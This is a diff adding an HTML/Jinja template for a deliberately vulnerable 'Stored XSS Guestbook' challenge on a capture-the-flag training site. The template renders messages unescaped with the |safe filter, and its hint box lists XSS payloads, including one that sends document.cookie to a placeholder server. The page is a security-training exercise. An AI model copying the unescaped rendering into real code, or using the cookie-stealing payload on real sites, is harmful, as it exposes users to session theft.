@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stored XSS Guestbook - Kiboswa CTF</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+    .guestbook-container {
+        max-width: 900px;
+        margin: 40px auto;
+        padding: 0 20px;
+    }
+    
+    .message-form {
+        background: rgba(255,255,255,0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 30px;
+        margin-bottom: 30px;
+    }
+    
+    .message-form textarea {
+        width: 100%;
+        padding: 15px;
+        background: rgba(255,255,255,0.1);
+        border: 1px solid rgba(0,212,176,0.3);
+        border-radius: 8px;
+        color: white;
+        margin-bottom: 15px;
+        min-height: 100px;
+    }
+    
+    .messages-list {
+        background: rgba(255,255,255,0.05);
+        border-radius: 20px;
+        padding: 30px;
+    }
+    
+    .message-card {
+        background: rgba(0,0,0,0.3);
+        border-radius: 10px;
+        padding: 15px;
+        margin-bottom: 15px;
+        border-left: 3px solid #00d4b0;
+    }
+    
+    .message-header {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 10px;
+        color: #00d4b0;
+        font-weight: bold;
+    }
+    
+    .message-content {
+        word-break: break-all;
+    }
+    
+    .warning {
+        background: rgba(244,67,54,0.1);
+        padding: 12px;
+        border-radius: 8px;
+        margin-bottom: 20px;
+        border-left: 3px solid #f44336;
+    }
+</style>
+</head>
+<body>
+
+<section class="header">
+    <h1>KIBOSWA CTF</h1>
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/dashboard">Dashboard</a></li>
+            <li><a href="/challenges">Challenges</a></li>
+            <li><a href="/logout">Logout</a></li>
+        </ul>
+    </nav>
+</section>
+
+<div class="guestbook-container">
+    <div style="text-align: center; margin-bottom: 30px;">
+        <i class="fas fa-book" style="font-size: 48px; color: #00d4b0;"></i>
+        <h1>Stored XSS Guestbook</h1>
+        <span class="challenge-difficulty">Easy</span>
+        <span class="challenge-points">75 pts</span>
+    </div>
+    
+    <div class="warning">
+        <i class="fas fa-exclamation-triangle"></i> This guestbook is vulnerable to Stored XSS. Try injecting JavaScript!
+    </div>
+    
+    <div class="message-form">
+        <form method="POST" action="/guestbook">
+            <textarea name="message" placeholder="Leave a message... (Try: &lt;script&gt;alert('XSS')&lt;/script&gt;)"></textarea>
+            <button type="submit" class="submit-btn" style="background: #00d4b0; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
+                <i class="fas fa-paper-plane"></i> Post Message
+            </button>
+        </form>
+    </div>
+    
+    <div class="messages-list">
+        <h3 style="color: #00d4b0; margin-bottom: 20px;">
+            <i class="fas fa-comments"></i> Messages
+        </h3>
+        
+        {% if messages %}
+            {% for msg in messages %}
+            <div class="message-card">
+                <div class="message-header">
+                    <span><i class="fas fa-user"></i> {{ msg.username }}</span>
+                    <span><i class="fas fa-clock"></i> Just now</span>
+                </div>
+                <div class="message-content">
+                    {{ msg.message|safe }}
+                </div>
+            </div>
+            {% endfor %}
+        {% else %}
+            <p style="text-align: center; color: #888;">No messages yet. Be the first to post!</p>
+        {% endif %}
+    </div>
+    
+    <div class="hint" style="background: rgba(255,193,7,0.1); padding: 15px; border-radius: 8px; margin-top: 20px;">
+        <p><i class="fas fa-lightbulb"></i> <strong>XSS Payloads:</strong></p>
+        <p><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Basic alert</p>
+        <p><code>&lt;img src=x onerror=alert('XSS')&gt;</code> - Image error XSS</p>
+        <p><code>&lt;script&gt;fetch('https://your-server.com?c='+document.cookie)&lt;/script&gt;</code> - Steal cookies</p>
+    </div>
+    
+    <a href="/challenges" class="back-link"><i class="fas fa-arrow-left"></i> Back to Challenges</a>
+</div>
+
+</body>
+</html>
